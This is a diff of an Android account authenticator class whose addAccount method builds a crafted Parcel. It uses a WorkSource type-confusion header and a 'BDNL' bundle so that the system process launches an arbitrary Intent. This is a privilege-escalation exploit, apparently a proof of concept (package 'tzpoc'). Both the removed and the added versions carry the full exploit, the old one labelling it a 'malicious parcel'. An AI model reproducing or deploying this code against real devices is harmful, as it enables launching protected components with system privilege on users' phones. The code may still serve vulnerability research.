@@ -9,141 +9,115 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Parcel;
+import android.util.Log;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
+
     public MyAuthenticator(Context context) {
         super(context);
     }
 
     @Override
-    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
+    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
         return null;
     }
 
     @Override
-    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
-                             String authTokenType, String[] requiredFeatures, Bundle options)
-            throws NetworkErrorException {
-
-        MainActivity.appendLog("[*] addAccount called. Building malicious parcel with Intent...");
-
-        // 起動するIntent（SystemCommandReceiverはBroadcastReceiverなので、直接起動はできないが、
-        // ここではProofActivityを起動して、その中でReceiverを呼び出すようにする）
-        // しかし、より直接的にReceiverを起動するには、Intentのactionを指定する方法もある。
-        // ここでは、BroadcastReceiverを起動するIntentを作成
-        Intent exploitIntent = new Intent();
-        exploitIntent.setComponent(new ComponentName(
-                "com.example.tzpoc",
-                "com.example.tzpoc.SystemCommandReceiver"
-        ));
+    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle options) throws NetworkErrorException {
+        final String TAG = "FadeMode";
+        // ---- ここを変更: ProofActivity を起動するIntent ----
         Intent intent = new Intent();
-        intent.setComponent(new ComponentName(
-                "com.example.tzpoc",
-                "com.example.tzpoc.ProofActivity"
-        ));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-
-        Parcel intentParcel = Parcel.obtain();
-        intent.writeToParcel(intentParcel, 0);
-
-        Parcel dataParcel = Parcel.obtain();
-        Parcel finalParcel = Parcel.obtain();
-
-        // WorkSource ヘッダー（型混淆用）
-        dataParcel.writeInt(3);
-        dataParcel.writeInt(13); // WorkSource type
-        dataParcel.writeInt(2);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(6);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(4);
-        dataParcel.writeString("android.os.WorkSource");
-        dataParcel.writeInt(-1);
-        dataParcel.writeInt(-1);
-        dataParcel.writeInt(-1);
-        dataParcel.writeInt(1);
-        dataParcel.writeInt(-1);
-        dataParcel.writeInt(13);
-        dataParcel.writeInt(13);
-        dataParcel.writeInt(68);
-        dataParcel.writeInt(11);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(7);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(1);
-        dataParcel.writeInt(1);
-        dataParcel.writeInt(13);
-        dataParcel.writeInt(22);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(0);
-        dataParcel.writeInt(13);
-        dataParcel.writeInt(-1);
-
-        // Intent データを埋め込む（キーは "result" に変更）
-        int startPos = dataParcel.dataPosition();
-        dataParcel.writeString("result");
-        dataParcel.writeInt(4); // PARCELABLE
-        dataParcel.writeString("android.content.Intent");
-        dataParcel.appendFrom(intentParcel, 0, intentParcel.dataSize());
-
-        int endPos = dataParcel.dataPosition();
-        dataParcel.setDataPosition(startPos - 4);
-        dataParcel.writeInt(endPos - startPos);
-        dataParcel.setDataPosition(endPos);
-
-        int totalSize = dataParcel.dataSize();
-        MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));
-
-        finalParcel.writeInt(totalSize);
-        finalParcel.writeInt(0x4c444e42); // "BDNL"
-        finalParcel.appendFrom(dataParcel, 0, totalSize);
-        finalParcel.setDataPosition(0);
-
-        Bundle result = new Bundle();
+        intent.setComponent(new ComponentName("com.example.tzpoc", "com.example.tzpoc.ProofActivity"));
+        // ----
+        Bundle bundle = new Bundle();
+        Parcel obtain = Parcel.obtain();
+        Parcel obtain2 = Parcel.obtain();
+        Parcel obtain3 = Parcel.obtain();
+        obtain2.writeInt(3);
+        obtain2.writeInt(13);
+        obtain2.writeInt(2);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(6);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(4);
+        obtain2.writeString("android.os.WorkSource");
+        obtain2.writeInt(-1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(13);
+        obtain2.writeInt(13);
+        obtain2.writeInt(68);
+        obtain2.writeInt(11);
+        obtain2.writeInt(0);
+        obtain2.writeInt(7);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(1);
+        obtain2.writeInt(1);
+        obtain2.writeInt(13);
+        obtain2.writeInt(22);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(13);
+        obtain2.writeInt(-1);
+        int dataPosition = obtain2.dataPosition();
+        obtain2.writeString("intent");
+        obtain2.writeInt(4);
+        obtain2.writeString("android.content.Intent");
+        intent.writeToParcel(obtain3, 0);
+        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
+        int dataPosition2 = obtain2.dataPosition();
+        obtain2.setDataPosition(dataPosition - 4);
+        obtain2.writeInt(dataPosition2 - dataPosition);
+        obtain2.setDataPosition(dataPosition2);
+        int dataSize = obtain2.dataSize();
+        Log.d(TAG, "length is " + Integer.toHexString(dataSize));
+        obtain.writeInt(dataSize);
+        obtain.writeInt(0x4c444E42);
+        obtain.appendFrom(obtain2, 0, dataSize);
+        obtain.setDataPosition(0);
         try {
-            result.readFromParcel(finalParcel);
-            MainActivity.appendLog("[+] Malicious bundle created.");
+            bundle.readFromParcel(obtain);
+            Log.d(TAG, bundle.toString());
         } catch (Exception e) {
-            MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
-            // クラッシュを回避するため空のBundleを返す
+            Log.e(TAG, "Failed to read parcel: " + e.getMessage());
+            // クラッシュ回避のため空のBundleを返す
             return new Bundle();
         }
-
-        intentParcel.recycle();
-        dataParcel.recycle();
-        finalParcel.recycle();
-
-        MainActivity.appendLog("[*] Returning malicious bundle to system process.");
-        return result;
+        return bundle;
     }
 
-    // その他の必須オーバーライド（空実装）
     @Override
-    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
+    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
         return null;
     }
+
     @Override
-    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
+    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
         return null;
     }
+
     @Override
-    public String getAuthTokenLabel(String authTokenType) {
+    public String getAuthTokenLabel(String s) {
         return null;
     }
+
     @Override
-    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
+    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
         return null;
     }
+
     @Override
-    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
+    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
         return null;
     }
 }
